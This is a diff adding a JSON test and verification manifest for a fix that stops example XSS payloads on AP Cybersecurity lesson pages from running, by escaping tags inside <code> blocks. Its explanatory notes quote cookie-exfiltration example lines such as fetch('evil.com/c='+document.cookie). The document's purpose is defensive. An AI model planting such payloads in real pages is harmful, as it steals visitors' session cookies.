@@ -1,0 +1,71 @@
+{
+  "change": "stop two AP Cyber Unit 5 pages BUILDING their own example attack payloads as script elements, by escaping the example tags inside <code> blocks (board 177)",
+  "checks": [
+    {
+      "kind": "suite",
+      "name": "position decides which script is an example, and a page the rule cannot finish is held rather than half-fixed",
+      "command": "npm run --silent smoke:cyberxss",
+      "expect": "22 passed, 0 failed"
+    },
+    {
+      "kind": "suite",
+      "name": "the shared storefront fetch, which now carries the Cloudflare detector",
+      "command": "npm run --silent smoke:storefront",
+      "expect": "22 passed, 0 failed"
+    },
+    {
+      "kind": "suite",
+      "name": "the house Matrixify preflight on the FINISHED file, with the live bodies supplied for a round trip",
+      "command": "node scripts/matrixify-preflight.js imports/2026-09-03/cyber-u5-example-escape-pages.csv --carrying smoke/fixtures/cyber-u5-original-bodies.json",
+      "expect": "clear to import"
+    },
+    {
+      "kind": "mutation",
+      "name": "THE ONE THE FIRST TWO RULES GOT WRONG: only position may decide what is an example",
+      "file": "scripts/cyber-xss-example-escape.js",
+      "find": "    if (spans.some((s) => m.index > s[0] && m.index < s[1])) out.push({ at: m.index, tag: m[0] });",
+      "replace": "    if (false) out.push({ at: m.index, tag: m[0] });",
+      "command": "npm run --silent smoke:cyberxss",
+      "expect_failure": "[FAIL] 1.1 both tags inside a <code> are found",
+      "_why": "Two smarter rules were tried before this one and both would have shipped. 'Escape what does not parse as JS' keeps fetch('evil.com/c='+document.cookie) running, because it parses. 'Keep what looks like page code' keeps the same payload, because the marker was document. and the payload reads document.cookie. Semantics cannot separate an example from the page's own code. Position can, and this is the line that does it."
+    },
+    {
+      "kind": "mutation",
+      "name": "a body Cloudflare rewrote at render time must never be written back",
+      "file": "lib/storefront-fetch.js",
+      "find": "  if (!CF_REWRITE.test(body || '')) return null;",
+      "replace": "  if (true) return null;",
+      "command": "npm run --silent smoke:cyberxss",
+      "expect_failure": "[FAIL] 3.2 a body Cloudflare rewrote at render time is skipped: importing it would make that permanent",
+      "_why": "ap-cyber-unit-5-lesson-5 serves a quiz option rendered as '[email protected]' because Cloudflare obfuscated it at render time with a key that rotates per render. Importing that body makes the placeholder permanent. On THIS site that is not cosmetic: the phishing exercises are built on lookalike domains a student is asked to spot, so writing the address out as a placeholder deletes the question. scripts/fetch-page-bodies.js has refused on this since it was written; the detector now lives on the shared fetch so every generator gets it from one place."
+    },
+    {
+      "kind": "mutation",
+      "name": "a page with a second defect this rule cannot reach must be HELD, not shipped improved",
+      "file": "scripts/cyber-xss-example-escape.js",
+      "find": "  if (badAfter > 0) {",
+      "replace": "  if (badAfter > badBefore) {",
+      "command": "npm run --silent smoke:cyberxss",
+      "expect_failure": "[FAIL] 3.3 a page carrying a SECOND defect this rule cannot reach is HELD, not half-fixed",
+      "_why": "This bar was relaxed to 'strictly better, never worse' during the build, so that pages whose payloads this DOES fix would not be held hostage to an unrelated defect. The house preflight caught it: it refuses any body with a script block that does not compile, because a page that does not work is not shipped on the ground that it works better than before. The relaxation was overriding a house guard to get a result, which is how bad bodies have shipped here before. This mutation restores that relaxation and requires the suite to go red."
+    },
+    {
+      "kind": "mutation",
+      "name": "a page that is not broken must never be edited",
+      "file": "scripts/cyber-xss-example-escape.js",
+      "find": "  if (!executing && !unparseable) {",
+      "replace": "  if (false) {",
+      "command": "npm run --silent smoke:cyberxss",
+      "expect_failure": "[FAIL] 3.1 a page with no executing payload and no fault is skipped, never edited",
+      "_why": "ap-cyber-unit-5-practice-exam holds a lone </script> inside a <code> and is currently fine. Escaping that closing tag could extend some other element's reach and break a working page. Having a scoped tag is not a reason to edit; being broken is."
+    },
+    {
+      "kind": "rederive",
+      "name": "Chromium, counting the script elements it actually BUILDS inside a <code>",
+      "command": "node scripts/verify-cyber-xss-escape.js",
+      "expect": "XSS ESCAPE VERIFIED",
+      "_why": "The generator uses its own regex model of HTML parsing, which is not the authority. This loads both bodies in a browser and counts document.querySelectorAll('code script'), a DOM fact. An earlier version of this check asserted that the live page requests evil.io and the escaped one does not; it reported 0 to 0 on every page, because fetch('evil.io/c?'+document.cookie) has no scheme and is a RELATIVE path that resolves to apcsexamprep.com's own server. That assertion could never fire, and it had made the reported severity wrong."
+    }
+  ],
+  "_held": "ap-cyber-unit-5-lesson-6 carries the two executing payloads and is NOT in this sheet. Escaping its <code>-scoped tags takes it from 7 unparseable blocks to 3, but the remaining 3 are the unescaped-quote class in its var ANS={...} answer key, which this rule does not reach and which the preflight rightly refuses. ap-cyber-unit-5-lesson-5 is held for the Cloudflare rewrite. ap-cyber-unit-5-lesson-5-exercise-1 is held because its two defects are entangled. All three need a human."
+}
